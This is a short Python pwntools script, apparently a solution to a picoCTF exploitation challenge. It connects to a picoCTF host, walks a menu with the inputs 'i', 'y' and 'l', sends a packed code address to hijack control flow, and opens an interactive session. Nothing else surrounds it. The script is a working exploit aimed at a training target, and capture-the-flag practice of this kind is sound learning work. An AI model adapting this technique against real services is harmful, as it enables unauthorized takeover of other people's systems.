from pwn import *

r = remote("mercury.picoctf.net", 6312)

payload = p32(0x80487d6)

r.sendline("i")
r.recv()
r.sendline("y")
r.recv()
r.sendline("l")
r.recv()
r.sendline(payload)
r.interactive()